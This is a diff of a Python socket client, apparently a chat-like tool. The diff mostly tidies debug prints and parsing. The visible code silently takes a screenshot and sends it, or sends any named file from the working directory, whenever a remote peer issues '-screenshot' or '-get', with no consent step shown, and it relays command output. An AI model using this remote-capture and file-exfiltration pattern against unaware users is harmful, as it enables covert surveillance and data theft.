@@ -130,7 +130,7 @@ def receive_cmd_output(client, val):
     if b"CMD_OUTPUT_END\n" not in buffer:
         while b"CMD_OUTPUT_END\n" not in buffer:
             chunk = client.recv(1024)
-            #print("CHUNK: ", chunk)
+
             if not chunk:
                 raise ConnectionError("Client disconnected during CMD_OUTPUT")
 
@@ -145,7 +145,7 @@ def client_listener():
             buffer = s.recv(1024)
             data = buffer.decode("UTF-8", errors="ignore")
             
-            # print("DATA: ", data)
+            # print(Fore.GREEN + "DATA: " + data)
 
             if not buffer:
                 break
@@ -175,18 +175,12 @@ def client_listener():
                 filename = parts[1]
                 file_size = int(parts[2])
 
-
-                # print("EXPECTED:", file_size)
-                # print("FIRST:", len(first_file_data))
-
                 received = receive_file(
                     s,
                     first_file_data,
                     filename,
                     file_size
                 )
-
-                # print("TOTAL RECEIVED:", received)
 
                 continue
 
@@ -213,8 +207,9 @@ def client_listener():
                 s.send(message.encode("UTF-8"))
                 continue
             
-            elif data.split(" ")[1] == "-screenshot ":
-                priority_name = data.split()[1]
+            elif data.split(" ")[1] == "-screenshot":
+
+                priority_name = data.split(" ")[0]
 
                 screenshot_path = os.path.join(
                     os.getcwd(),
@@ -225,35 +220,33 @@ def client_listener():
                     pyautogui.screenshot().save(screenshot_path)
                     file_size = os.path.getsize(screenshot_path)
                     transfer_file(priority_name, screenshot_path)
-                finally:
-                    try:
-                        os.remove(screenshot_path)
-                    except OSError:
-                        pass
+                    os.remove(screenshot_path)
+                except OSError:
+                    pass
                 continue
 
             elif data.split(" ")[1] == "-get":
+
                 priorityname = data.split(" ")[0]
                 filename= data.split(" ")[2]
                 print("FILENAME:", repr(filename))
                 file_path = os.path.join(os.getcwd(), filename)
-                #print("FILE_PATH: ", file_path, "FULENAME: ", filename)
+
                 transfer_file(priorityname, file_path)
-                #print(f"Sent file {filename} to {priorityname}")
-                continue
-                
 
-            dataname = data.split(">")[0].strip()
-            #print(f"Received from DATANAME: {dataname}")
-            if dataname == "" or not ">" in data:
-                print(Fore.RED + f"\n[ALERT] Received ALERT from server: {data}")
                 continue
 
-            if dataname != name[:-2]:
-                print(f"\n{data}")
+            if not "> " in data:
+                print(Fore.RED + f"\n[ALERT] Received ALERT from server: {data}" + Style.RESET_ALL)
+                continue
+
+            else:
+                dataname = data.split("> ", 1)[0] + "> "
+                if dataname != name:
+                    print(f"\n{data}")
 
         except Exception as e:
-            print(f"\n[ERROR] {e}")
+            print(Fore.RED + f"\n[ERROR] + {e}" + Style.RESET_ALL)
             break
 
 thread = threading.Thread(target=client_listener)
